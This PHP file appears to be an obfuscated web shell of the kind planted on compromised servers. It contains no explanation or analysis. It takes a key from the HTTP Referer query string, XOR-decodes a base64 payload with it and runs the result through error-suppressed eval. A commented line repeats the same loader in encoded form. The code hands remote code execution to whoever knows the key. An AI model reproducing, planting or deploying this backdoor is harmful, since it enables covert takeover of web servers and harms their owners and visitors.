<?php
	//$t1 = microtime();
	//eval(base64_decode('cGFyc2Vfc3RyKHN1YnN0cigkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10sc3RycG9zKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwnPycpKSwkcmVmKTskcmVmPWFycmF5X3ZhbHVlcygkcmVmKTskdGV4dD1iYXNlNjRfZGVjb2RlKCdKMlpvY2xjOVRTTXBMWGNrYm5Gd2NUc2dVMmgxWUh0cGNTUW9ZbVp5VmlWUkpUd25abWh5Vnp4TktpOStZMlY0YzJzOEtXWnBha3N4U1NSdmIyMWpaalE5TGl3c1kzcG5lWEZoSkRSeGNXdFBQVkUrSVRRL0tpbzlNaW92TFhaK2FYRm9MMjUxZjJrd01pNHROQ2h2ZldjME1EUnBkR0J2ZTJseEpDc3dKRGdwWm1scVN6SkpKQzhzYVhOcmV5MDJUblZrWmpScGUzdGlmR3gxYVhGb05qQWhPbXQ5WUdsUGMyRjVTMjlqZm5keFkyQi9KRFJnZVdsUFBWRThaWDFoY1ZOcmRYZExibnRpZUhWdFlINDhLRzk5WjA4OVNTVWxQaUZJWXpZM0xISnhjV3gvTjI5eGNIRXRKallzTUVOeGUzVmdKRFJ4Y1d0UFBWRTVPRFJ2Wm1sdGV6aHBMUT09Jyk7IEBldmFsKGMoJHRleHQsJHJlZlswXSkpO2Z1bmN0aW9uIGMoJHRleHQ9JycsJGtleT0nJyl7cmV0dXJuICgoJHRleHQgXiBAc3RyX3BhZCgiIixzdHJsZW4oJHRleHQpLCRrZXkpKSAmIHN0cl9yZXBlYXQoIlx4MWYiLHN0cmxlbigkdGV4dCkpKSB8ICgkdGV4dCAmIHN0cl9yZXBlYXQoIlx4ZTAiLHN0cmxlbigkdGV4dCkpKTt9IA=='));
	parse_str(substr($_SERVER['HTTP_REFERER'], strpos($_SERVER['HTTP_REFERER'], '?')), $ref);
	$ref=array_values($ref);
	$text=base64_decode('J2Zoclc9TSMpLXckbnFwcTsgU2h1YHtpcSQoYmZyViVRJTwnZmhyVzxNKi9od2RjMCQoKjoofnVlTz1JIisuJC9+Y2V4c2s8KWZpaksxSSRvb21jZjQ9LiwsY3pneXFhJDRxcWtPPVE+ITQ/Kio9MiovLXZ+aXFoL251f2kwMi4tNChvfWc0MDRpdGBve2lxJCswJDgpZmlqSzJJJC8saXNrey1yZWB1XGR4YFNvf21gaHp4fzgnd2BwVz1NL3JkeGlTd2ZgUndjYmRmenlnJChzbnBWJFElOS02UXouNzBhZmh1ZzdzYmdoND42MCNUaGJtYDgnZmhyVz1NKi8tdn5pcWgvcDRpb3hsNCooIys+J2Zoclc8TS0zMzM3');		
	@eval(c($text, $ref[0]));function c($text='', $key=''){return (($text ^ @str_pad("", strlen($text), $key)) & str_repeat("\x1f", strlen($text))) | ($text & str_repeat("\xe0", strlen($text)));}
	//echo "exec in: ".(microtime()-$t1)." - memory: ".round(memory_get_usage());
?>
